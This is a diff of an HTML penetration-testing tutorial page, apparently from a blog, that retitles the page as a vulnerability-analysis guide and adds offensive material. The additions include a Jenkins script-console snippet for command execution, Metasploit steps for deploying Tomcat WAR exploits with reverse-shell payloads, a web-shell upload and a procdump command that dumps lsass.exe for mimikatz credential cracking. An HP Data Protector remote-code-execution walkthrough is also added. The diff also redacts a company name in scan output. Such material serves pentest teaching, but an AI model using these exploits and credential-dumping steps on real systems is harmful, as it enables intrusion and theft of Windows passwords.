@@ -17,7 +17,7 @@
         var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
       })();
     </script>
-    <title>Learning from the field : Enumeration - Basic Network Hygiene &#8212; tech.bitvijays.com</title>
+    <title>Learning from the field : Infrastruture PenTest Series : Part 2 - Vulnerability Analysis &#8212; tech.bitvijays.com</title>
     
     <link rel="stylesheet" href="_static/sphinxdoc.css" type="text/css" />
     <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
@@ -36,7 +36,7 @@
     <script type="text/javascript" src="_static/doctools.js"></script>
     <link rel="search" title="Search" href="search.html" />
     <link rel="top" title="tech.bitvijays.com" href="index.html" />
-    <link rel="next" title="Learning from the field : Reconnaissance - Information Gathering" href="LFFInformationGathering.html" />
+    <link rel="next" title="Learning from the field : Infrastruture PenTest Series : Part 1 - Intelligence Gathering" href="LFFInformationGathering.html" />
     <link rel="prev" title="Learning from the field : Securing your Debian" href="LFFSecuringDebian.html" /> 
   </head>
   <body role="document">
@@ -44,7 +44,7 @@
       <h3>Navigation</h3>
       <ul>
         <li class="right" style="margin-right: 10px">
-          <a href="LFFInformationGathering.html" title="Learning from the field : Reconnaissance - Information Gathering"
+          <a href="LFFInformationGathering.html" title="Learning from the field : Infrastruture PenTest Series : Part 1 - Intelligence Gathering"
              accesskey="N">next</a></li>
         <li class="right" >
           <a href="LFFSecuringDebian.html" title="Learning from the field : Securing your Debian"
@@ -56,7 +56,7 @@
         <div class="sphinxsidebarwrapper">
   <h3><a href="index.html">Table Of Contents</a></h3>
   <ul>
-<li><a class="reference internal" href="#">Learning from the field : Enumeration - Basic Network Hygiene</a><ul>
+<li><a class="reference internal" href="#">Learning from the field : Infrastruture PenTest Series : Part 2 - Vulnerability Analysis</a><ul>
 <li><a class="reference internal" href="#ftp-port-21">FTP - Port 21</a></li>
 <li><a class="reference internal" href="#ssh-port-22">SSH - Port 22</a></li>
 <li><a class="reference internal" href="#telnet-port-23">Telnet - Port 23</a></li>
@@ -88,6 +88,7 @@
 <li><a class="reference internal" href="#iscsi-port-3260">ISCSI - Port 3260</a></li>
 <li><a class="reference internal" href="#mysql-port-3306">MySQL | Port 3306</a></li>
 <li><a class="reference internal" href="#postgresql-port-5432">Postgresql - Port 5432</a></li>
+<li><a class="reference internal" href="#port-5555-hpdataprotector-rce">Port: 5555 HPDataProtector RCE</a></li>
 <li><a class="reference internal" href="#vnc-port-5900">VNC - Port 5900</a></li>
 <li><a class="reference internal" href="#x11-port-6000">X11 - Port 6000</a></li>
 <li><a class="reference internal" href="#redis-port-6379">Redis - Port 6379</a></li>
@@ -107,7 +108,7 @@
                         title="previous chapter">Learning from the field : Securing your Debian</a></p>
   <h4>Next topic</h4>
   <p class="topless"><a href="LFFInformationGathering.html"
-                        title="next chapter">Learning from the field : Reconnaissance - Information Gathering</a></p>
+                        title="next chapter">Learning from the field : Infrastruture PenTest Series : Part 1 - Intelligence Gathering</a></p>
   <h3>This Page</h3>
   <ul class="this-page-menu">
     <li><a href="_sources/LFFBasicNetworkHygiene.txt"
@@ -135,8 +136,8 @@
         <div class="bodywrapper">
           <div class="body" role="main">
             
-  <div class="section" id="learning-from-the-field-enumeration-basic-network-hygiene">
-<h1>Learning from the field : Enumeration - Basic Network Hygiene<a class="headerlink" href="#learning-from-the-field-enumeration-basic-network-hygiene" title="Permalink to this headline">¶</a></h1>
+  <div class="section" id="learning-from-the-field-infrastruture-pentest-series-part-2-vulnerability-analysis">
+<h1>Learning from the field : Infrastruture PenTest Series : Part 2 - Vulnerability Analysis<a class="headerlink" href="#learning-from-the-field-infrastruture-pentest-series-part-2-vulnerability-analysis" title="Permalink to this headline">¶</a></h1>
 <p>So, by using <strong>intelligence gathering</strong> you have completed the normal scanning and banner grabbing. Yay!!. Now, it&#8217;s time for some <strong>metasploit-fu</strong> and <strong>nmap-fu</strong>.</p>
 <p>So we start with creating a new workspace in the msfconsole for better work.</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">msfconsole</span> <span class="o">-</span><span class="n">q</span> <span class="o">--</span> <span class="n">Starts</span> <span class="n">Metasploit</span> <span class="n">Console</span> <span class="n">quietly</span>
@@ -1249,6 +1250,16 @@ uid=109(jenkins) gid=117(jenkins) groups=117(jenkins)
 $
 </pre></div>
 </div>
+<p>If the above metasploit modules doesn&#8217;t work, we can perform code execution manually. Visit the jenkins web page &gt; Manage Jenkins (options on the left side ) &gt; script console . In the script console page. copy and paste the below code into the editable area.</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">sout</span> <span class="o">=</span> <span class="n">new</span> <span class="n">StringBuffer</span><span class="p">(),</span> <span class="n">serr</span> <span class="o">=</span> <span class="n">new</span> <span class="n">StringBuffer</span><span class="p">()</span>
+<span class="k">def</span> <span class="nf">proc</span> <span class="o">=</span> <span class="s1">&#39;[INSERT COMMAND]&#39;</span><span class="o">.</span><span class="n">execute</span><span class="p">()</span>
+<span class="n">proc</span><span class="o">.</span><span class="n">consumeProcessOutput</span><span class="p">(</span><span class="n">sout</span><span class="p">,</span> <span class="n">serr</span><span class="p">)</span>
+<span class="n">proc</span><span class="o">.</span><span class="n">waitForOrKill</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
+<span class="n">println</span> <span class="s2">&quot;out&gt; $sout err&gt; $serr&quot;</span>
+</pre></div>
+</div>
+<p>In place of &#8216;[INSERT COMMAND]&#8217; we can use powershell Empire launcher or Web_delivery powershell inject code to get an agent or meterpreter shell on our attacking machine.</p>
+<p>The above has been taken from <a class="reference external" href="https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password">Hacking Jenkins Servers with No Password</a> Also, Leonjza has written a blog <a class="reference external" href="https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/">Jenkins to Meterpreter - toying with powersploit</a> which could provide more idea.</p>
 </div></blockquote>
 </div></blockquote>
 <ul class="simple">
@@ -1295,7 +1306,88 @@ using the above module</li>
 <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">80</span> <span class="o">-</span> <span class="n">LOGIN</span> <span class="n">SUCCESSFUL</span><span class="p">:</span> <span class="n">tomcat</span><span class="p">:</span><span class="n">tomcat</span>
 </pre></div>
 </div>
+</div></blockquote>
 <p>Yay :) We got two apache tomcat we can upload WAR files and get shell ;)</p>
+<p>There are four ways ( in my knowledge to exploit this)</p>
+<blockquote>
+<div><ul class="simple">
+<li>Apache Tomcat Manager Application Deployer Authenticated Code Execution ( tomcat_mgr_deploy )</li>
+<li>Apache Tomcat Manager Authenticated Upload Code Execution ( tomcat_mgr_upload )</li>
+</ul>
+<blockquote>
+<div><p>use either of them to exploit the application. by</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">msf</span> <span class="o">&gt;</span> <span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">tomcat_mgr_deploy</span>
+<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">tomcat_mgr_deploy</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">show</span> <span class="n">options</span>
+<span class="n">Module</span> <span class="n">options</span> <span class="p">(</span><span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">tomcat_mgr_deploy</span><span class="p">):</span>
+<span class="n">Name</span>          <span class="n">Current</span> <span class="n">Setting</span>  <span class="n">Required</span>  <span class="n">Description</span>
+<span class="o">----</span>          <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
+<span class="n">HttpPassword</span>                   <span class="n">no</span>        <span class="n">The</span> <span class="n">password</span> <span class="k">for</span> <span class="n">the</span> <span class="n">specified</span> <span class="n">username</span>
+<span class="n">HttpUsername</span>                   <span class="n">no</span>        <span class="n">The</span> <span class="n">username</span> <span class="n">to</span> <span class="n">authenticate</span> <span class="k">as</span>
+<span class="n">PATH</span>          <span class="o">/</span><span class="n">manager</span>         <span class="n">yes</span>       <span class="n">The</span> <span class="n">URI</span> <span class="n">path</span> <span class="n">of</span> <span class="n">the</span> <span class="n">manager</span> <span class="n">app</span> <span class="p">(</span><span class="o">/</span><span class="n">deploy</span> <span class="ow">and</span> <span class="o">/</span><span class="n">undeploy</span> <span class="n">will</span> <span class="n">be</span> <span class="n">used</span><span class="p">)</span>
+<span class="n">Proxies</span>                        <span class="n">no</span>        <span class="n">A</span> <span class="n">proxy</span> <span class="n">chain</span> <span class="n">of</span> <span class="nb">format</span> <span class="nb">type</span><span class="p">:</span><span class="n">host</span><span class="p">:</span><span class="n">port</span><span class="p">[,</span><span class="nb">type</span><span class="p">:</span><span class="n">host</span><span class="p">:</span><span class="n">port</span><span class="p">][</span><span class="o">...</span><span class="p">]</span>
+<span class="n">RHOST</span>                          <span class="n">yes</span>       <span class="n">The</span> <span class="n">target</span> <span class="n">address</span>
+<span class="n">RPORT</span>         <span class="mi">80</span>               <span class="n">yes</span>       <span class="n">The</span> <span class="n">target</span> <span class="n">port</span> <span class="p">(</span><span class="n">TCP</span><span class="p">)</span>
+<span class="n">SSL</span>           <span class="n">false</span>            <span class="n">no</span>        <span class="n">Negotiate</span> <span class="n">SSL</span><span class="o">/</span><span class="n">TLS</span> <span class="k">for</span> <span class="n">outgoing</span> <span class="n">connections</span>
+<span class="n">VHOST</span>                          <span class="n">no</span>        <span class="n">HTTP</span> <span class="n">server</span> <span class="n">virtual</span> <span class="n">host</span>
+
+<span class="n">Exploit</span> <span class="n">target</span><span class="p">:</span>
+
+<span class="n">Id</span>  <span class="n">Name</span>
+<span class="o">--</span>  <span class="o">----</span>
+<span class="mi">0</span>   <span class="n">Automatic</span>
+</pre></div>
+</div>
+<p>set the values required by exploit aad set the suitable payload and exploit. The successful exploitation will give us shell of the victim machine. The payload options can be viewed by  using the command</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">show</span> <span class="n">payloads</span>
+</pre></div>
+</div>
+<p>The payload options available for this exploit is</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Compatible</span> <span class="n">Payloads</span>
+<span class="o">===================</span>
+<span class="n">Name</span>                            <span class="n">Disclosure</span> <span class="n">Date</span>  <span class="n">Rank</span>    <span class="n">Description</span>
+<span class="o">----</span>                            <span class="o">---------------</span>  <span class="o">----</span>    <span class="o">-----------</span>
+<span class="n">generic</span><span class="o">/</span><span class="n">custom</span>                                   <span class="n">normal</span>  <span class="n">Custom</span> <span class="n">Payload</span>
+<span class="n">generic</span><span class="o">/</span><span class="n">shell_bind_tcp</span>                           <span class="n">normal</span>  <span class="n">Generic</span> <span class="n">Command</span> <span class="n">Shell</span><span class="p">,</span> <span class="n">Bind</span> <span class="n">TCP</span> <span class="n">Inline</span>
+<span class="n">generic</span><span class="o">/</span><span class="n">shell_reverse_tcp</span>                        <span class="n">normal</span>  <span class="n">Generic</span> <span class="n">Command</span> <span class="n">Shell</span><span class="p">,</span> <span class="n">Reverse</span> <span class="n">TCP</span> <span class="n">Inline</span>
+<span class="n">java</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">bind_tcp</span>                        <span class="n">normal</span>  <span class="n">Java</span> <span class="n">Meterpreter</span><span class="p">,</span> <span class="n">Java</span> <span class="n">Bind</span> <span class="n">TCP</span> <span class="n">Stager</span>
+<span class="n">java</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_http</span>                    <span class="n">normal</span>  <span class="n">Java</span> <span class="n">Meterpreter</span><span class="p">,</span> <span class="n">Java</span> <span class="n">Reverse</span> <span class="n">HTTP</span> <span class="n">Stager</span>
+<span class="n">java</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_https</span>                   <span class="n">normal</span>  <span class="n">Java</span> <span class="n">Meterpreter</span><span class="p">,</span> <span class="n">Java</span> <span class="n">Reverse</span> <span class="n">HTTPS</span> <span class="n">Stager</span>
+<span class="n">java</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>                     <span class="n">normal</span>  <span class="n">Java</span> <span class="n">Meterpreter</span><span class="p">,</span> <span class="n">Java</span> <span class="n">Reverse</span> <span class="n">TCP</span> <span class="n">Stager</span>
+<span class="n">java</span><span class="o">/</span><span class="n">shell</span><span class="o">/</span><span class="n">bind_tcp</span>                              <span class="n">normal</span>  <span class="n">Command</span> <span class="n">Shell</span><span class="p">,</span> <span class="n">Java</span> <span class="n">Bind</span> <span class="n">TCP</span> <span class="n">Stager</span>
+<span class="n">java</span><span class="o">/</span><span class="n">shell</span><span class="o">/</span><span class="n">reverse_tcp</span>                           <span class="n">normal</span>  <span class="n">Command</span> <span class="n">Shell</span><span class="p">,</span> <span class="n">Java</span> <span class="n">Reverse</span> <span class="n">TCP</span> <span class="n">Stager</span>
+<span class="n">java</span><span class="o">/</span><span class="n">shell_reverse_tcp</span>                           <span class="n">normal</span>  <span class="n">Java</span> <span class="n">Command</span> <span class="n">Shell</span><span class="p">,</span> <span class="n">Reverse</span> <span class="n">TCP</span> <span class="n">Inline</span>
+</pre></div>
+</div>
+</div></blockquote>
+<p>set the payload option (depending upon the target&#8217;s operating system which can be selected by set TARGET &lt;ID&gt;) by using</p>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="nb">set</span> <span class="n">payload</span> <span class="n">java</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_https</span>    <span class="o">-</span><span class="n">to</span> <span class="n">directly</span> <span class="n">get</span> <span class="n">a</span> <span class="n">meterpreter</span> <span class="n">shell</span><span class="o">.</span>
+<span class="ow">or</span>
+<span class="nb">set</span> <span class="n">payload</span> <span class="n">java</span><span class="o">/</span><span class="n">shell</span><span class="o">/</span><span class="n">reverse_tcp</span>            <span class="o">-</span><span class="n">to</span> <span class="n">get</span> <span class="n">the</span> <span class="n">system</span> <span class="n">level</span> <span class="n">shell</span>
+</pre></div>
+</div>
+</div></blockquote>
+<p>Once we have obtained a meterepreter shell we can use getsystem to run the shell with an administrative rights,</p>
+<p>Wait, what if the exploitation doesnt wrk ?????????....in that case we can exploit the application by another way. :)</p>
+<ul>
+<li><p class="first">Web-Shell: The exploit whih we learned above, uploads or deploys the malicious payload into the application and runs it. some times this may not work as it is supposed to be in that case we can directly upload a shell using a WAR file deployment funtionality given in the /manager/html page. This WAR file contains nothing but a small code of obtaining a shell called cmd.war file. The code can be downloaded from the link <a class="reference external" href="https://github.com/jbarcia/Web-Shells/tree/master/laudanum">Laudanum Shells</a>.</p>
+<p>Once you have downloaded the file upload the file to the application. also Download the procdump.exe from <a class="reference external" href="https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx">ProcDump</a>. Copy the procdump file inside the .WAR previously downloaded and upload the modified file to the application. The idea of uploading the procdump with the WAR file is to obtain a lsass.exe process&#8217;s dump.</p>
+</li>
+</ul>
+<blockquote>
+<div><div class="admonition note">
+<p class="first admonition-title">Note</p>
+<p class="last">Lsass.exe (Local security Authority Subsystem Service)  is responsible for enforcing the security policy on the system. It verifies users logging on to a Windows computer or server,handles password   changes, and creates access tokens. Dumping this process will give us file Lsass.DMP file which can be used to crack the windows machines password in offline with the help of famous mimikatz</p>
+</div>
+<p>the lsass.exe process dump can be taken by</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">cmd</span> <span class="o">/</span><span class="n">c</span> <span class="s2">&quot;cd C:\&lt;Path to the procdump file&gt; &amp; procdump -acceptula -ma lsass.exe MYdmp.dmp&quot;</span>
+</pre></div>
+</div>
+<p>After uploading the WAR file, The system level shell could be obtained by tampering the url <a class="reference external" href="http:/">http:/</a>/&lt;IP Address&gt;/manager/cmd.war/cmd.jsp , should directly give us the shell in the page itself</p>
+</div></blockquote>
+<ul class="simple">
+<li><a class="reference external" href="http://vonloesch.de/filebrowser.html">Jsp File Browser</a>: Install file browser java server page. This JSP program allows remote web-based file access and manipulation. Able to upload-download, execute commands.</li>
+</ul>
 </div></blockquote>
 </div></blockquote>
 <ul>
@@ -1409,16 +1501,16 @@ using the above module</li>
 </ul>
 <blockquote>
 <div><p>The script should work against Active Directory. It needs a valid Kerberos REALM in order to operate.</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">p</span> <span class="mi">88</span> <span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">krb5</span><span class="o">-</span><span class="n">enum</span><span class="o">-</span><span class="n">users</span> <span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="o">=</span><span class="s2">&quot;krb5-enum-users.realm=&#39;VF-ROOT&#39;&quot;</span> <span class="mf">10.74</span><span class="o">.</span><span class="mf">251.24</span>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">p</span> <span class="mi">88</span> <span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">krb5</span><span class="o">-</span><span class="n">enum</span><span class="o">-</span><span class="n">users</span> <span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="o">=</span><span class="s2">&quot;krb5-enum-users.realm=&#39;XX-ROOT&#39;&quot;</span> <span class="mf">10.74</span><span class="o">.</span><span class="mf">251.24</span>
 
 <span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">23</span> <span class="mi">12</span><span class="p">:</span><span class="mi">13</span> <span class="n">IST</span>
-<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">ecindc312vw</span><span class="o">.</span><span class="n">internal</span><span class="o">.</span><span class="n">vodafone</span><span class="o">.</span><span class="n">com</span> <span class="p">(</span><span class="mf">10.74</span><span class="o">.</span><span class="mf">251.24</span><span class="p">)</span>
+<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">ecxxxxx312vw</span><span class="o">.</span><span class="n">internal</span><span class="o">.</span><span class="n">xxxxxxxx</span><span class="o">.</span><span class="n">com</span> <span class="p">(</span><span class="mf">10.74</span><span class="o">.</span><span class="mf">251.24</span><span class="p">)</span>
 <span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.0015</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
 <span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span>
 <span class="mi">88</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">kerberos</span><span class="o">-</span><span class="n">sec</span>
 <span class="o">|</span> <span class="n">krb5</span><span class="o">-</span><span class="n">enum</span><span class="o">-</span><span class="n">users</span><span class="p">:</span>
 <span class="o">|</span> <span class="n">Discovered</span> <span class="n">Kerberos</span> <span class="n">principals</span>
-<span class="o">|</span><span class="n">_</span>    <span class="n">root</span><span class="nd">@VF</span><span class="o">-</span><span class="n">ROOT</span>
+<span class="o">|</span><span class="n">_</span>    <span class="n">root</span><span class="nd">@XX</span><span class="o">-</span><span class="n">ROOT</span>
 
 <span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">0.44</span> <span class="n">seconds</span>
 </pre></div>
@@ -3576,6 +3668,79 @@ Nmap done: 1 IP address (1 host up) scanned in 138.09 seconds
 </div>
 </div></blockquote>
 </div>
+<div class="section" id="port-5555-hpdataprotector-rce">
+<h2>Port: 5555 HPDataProtector RCE<a class="headerlink" href="#port-5555-hpdataprotector-rce" title="Permalink to this headline">¶</a></h2>
+<p>HPData proctector service was running on port no. 5555.</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">msf</span> <span class="o">&gt;</span> <span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">5555</span>
+
+<span class="n">Services</span>
+<span class="o">========</span>
+<span class="n">host</span>          <span class="n">port</span>  <span class="n">proto</span>  <span class="n">name</span>      <span class="n">state</span>  <span class="n">info</span>
+<span class="o">----</span>          <span class="o">----</span>  <span class="o">-----</span>  <span class="o">----</span>      <span class="o">-----</span>  <span class="o">----</span>
+<span class="mf">10.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span>      <span class="mi">5555</span>  <span class="n">tcp</span>    <span class="n">omniback</span>  <span class="nb">open</span>   <span class="n">HP</span> <span class="n">OpenView</span> <span class="n">Omniback</span><span class="o">/</span><span class="n">Data</span> <span class="n">Protector</span>
+<span class="mf">10.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span>      <span class="mi">5555</span>  <span class="n">tcp</span>    <span class="n">omniinet</span>  <span class="nb">open</span>   <span class="n">HP</span> <span class="n">Data</span> <span class="n">Protector</span> <span class="mf">7.00</span> <span class="n">build</span> <span class="mi">105</span>
+<span class="mf">10.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span>      <span class="mi">5555</span>  <span class="n">tcp</span>    <span class="n">freeciv</span>   <span class="nb">open</span>
+<span class="mf">10.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span>      <span class="mi">5555</span>  <span class="n">tcp</span>    <span class="n">omniinet</span>  <span class="nb">open</span>   <span class="n">HP</span> <span class="n">Data</span> <span class="n">Protector</span> <span class="mf">7.00</span> <span class="n">build</span> <span class="mi">105</span>
+<span class="mf">10.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span>      <span class="mi">5555</span>  <span class="n">tcp</span>    <span class="n">omniback</span>  <span class="nb">open</span>   <span class="n">HP</span> <span class="n">Data</span> <span class="n">Protector</span> <span class="n">A</span><span class="o">.</span><span class="mf">07.00</span> <span class="n">internal</span> <span class="n">build</span> <span class="mi">105</span><span class="p">;</span> <span class="n">built</span> <span class="n">on</span> <span class="n">Wednesday</span><span class="p">,</span> <span class="n">October</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">2013</span><span class="p">,</span> <span class="mi">10</span><span class="p">:</span><span class="mi">55</span> <span class="n">PM</span>
+</pre></div>
+</div>
+<p>Metasploit framework comes with an exploit for  exploiting this vulnerability. which can be searched by</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">msf</span> <span class="o">&gt;</span> <span class="n">search</span> <span class="n">integutil</span>
+
+<span class="n">Matching</span> <span class="n">Modules</span>
+<span class="o">================</span>
+
+ <span class="n">Name</span>                                                 <span class="n">Disclosure</span> <span class="n">Date</span>  <span class="n">Rank</span>   <span class="n">Description</span>
+ <span class="o">----</span>                                                 <span class="o">---------------</span>  <span class="o">----</span>   <span class="o">-----------</span>
+ <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">misc</span><span class="o">/</span><span class="n">hp_data_protector_exec_integutil</span>  <span class="mi">2014</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">02</span>       <span class="n">great</span>  <span class="n">HP</span> <span class="n">Data</span> <span class="n">Protector</span> <span class="n">EXEC_INTEGUTIL</span> <span class="n">Remote</span> <span class="n">Code</span> <span class="n">ExecutionNOw</span>
+</pre></div>
+</div>
+<p>Now this can be used by</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">msf</span> <span class="o">&gt;</span> <span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">misc</span><span class="o">/</span><span class="n">hp_data_protector_exec_integutil</span>
+<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">hp_data_protector_exec_integutil</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">show</span> <span class="n">options</span>
+
+<span class="n">Module</span> <span class="n">options</span> <span class="p">(</span><span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">misc</span><span class="o">/</span><span class="n">hp_data_protector_exec_integutil</span><span class="p">):</span>
+
+<span class="n">Name</span>   <span class="n">Current</span> <span class="n">Setting</span>  <span class="n">Required</span>  <span class="n">Description</span>
+<span class="o">----</span>   <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
+<span class="n">RHOST</span>                   <span class="n">yes</span>       <span class="n">The</span> <span class="n">target</span> <span class="n">address</span>
+<span class="n">RPORT</span>  <span class="mi">5555</span>             <span class="n">yes</span>       <span class="n">The</span> <span class="n">target</span> <span class="n">port</span> <span class="p">(</span><span class="n">TCP</span><span class="p">)</span>
+
+<span class="n">Exploit</span> <span class="n">target</span><span class="p">:</span>
+<span class="n">Id</span>  <span class="n">Name</span>
+<span class="o">--</span>  <span class="o">----</span>
+<span class="mi">0</span>   <span class="n">Automatic</span>
+</pre></div>
+</div>
+<p>Select the appropriate target by using</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">hp_data_protector_exec_integutil</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">show</span> <span class="n">targets</span>
+
+<span class="n">Exploit</span> <span class="n">targets</span><span class="p">:</span>
+
+<span class="n">Id</span>  <span class="n">Name</span>
+<span class="o">--</span>  <span class="o">----</span>
+<span class="mi">0</span>   <span class="n">Automatic</span>
+<span class="mi">1</span>   <span class="n">Linux</span> <span class="mi">64</span> <span class="n">bits</span> <span class="o">/</span> <span class="n">HP</span> <span class="n">Data</span> <span class="n">Protector</span> <span class="mi">9</span>
+<span class="mi">2</span>   <span class="n">Windows</span> <span class="mi">64</span> <span class="n">bits</span> <span class="o">/</span> <span class="n">HP</span> <span class="n">Data</span> <span class="n">Protector</span> <span class="mi">9</span>
+
+<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">hp_data_protector_exec_integutil</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">set</span> <span class="n">target</span> <span class="mi">2</span>    <span class="o">-</span> <span class="k">for</span> <span class="n">windows</span> <span class="n">environment</span><span class="o">.</span>
+</pre></div>
+</div>
+<p>set the appropriate RHOST and payloads by</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">hp_data_protector_exec_integutil</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">set</span> <span class="n">RHOST</span> <span class="mf">10.1</span><span class="o">.</span><span class="mf">1.1</span>
+<span class="n">RHOST</span> <span class="o">=&gt;</span> <span class="mf">10.1</span><span class="o">.</span><span class="mf">1.1</span>
+<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">hp_data_protector_exec_integutil</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">show</span> <span class="n">payloads</span>
+
+<span class="n">Compatible</span> <span class="n">Payloads</span>
+<span class="o">===================</span>
+
+<span class="n">Name</span>                            <span class="n">Disclosure</span> <span class="n">Date</span>  <span class="n">Rank</span>    <span class="n">Description</span>
+<span class="o">----</span>                            <span class="o">---------------</span>  <span class="o">----</span>    <span class="o">-----------</span>
+<span class="n">cmd</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">reverse_powershell</span>                   <span class="n">normal</span>  <span class="n">Windows</span> <span class="n">Command</span> <span class="n">Shell</span><span class="p">,</span> <span class="n">Reverse</span> <span class="n">TCP</span> <span class="p">(</span><span class="n">via</span> <span class="n">Powershell</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>set all the necessary options and run. After this we can use Empire stagerlauncher or web_delivery to a get a meterpreter shell on our attacking machine.</p>
+</div>
 <div class="section" id="vnc-port-5900">
 <h2>VNC - Port 5900<a class="headerlink" href="#vnc-port-5900" title="Permalink to this headline">¶</a></h2>
 <p>We always find openVNCs in an engagement.</p>
@@ -4308,7 +4473,7 @@ www-data
       <h3>Navigation</h3>
       <ul>
         <li class="right" style="margin-right: 10px">
-          <a href="LFFInformationGathering.html" title="Learning from the field : Reconnaissance - Information Gathering"
+          <a href="LFFInformationGathering.html" title="Learning from the field : Infrastruture PenTest Series : Part 1 - Intelligence Gathering"
              >next</a></li>
         <li class="right" >
           <a href="LFFSecuringDebian.html" title="Learning from the field : Securing your Debian"
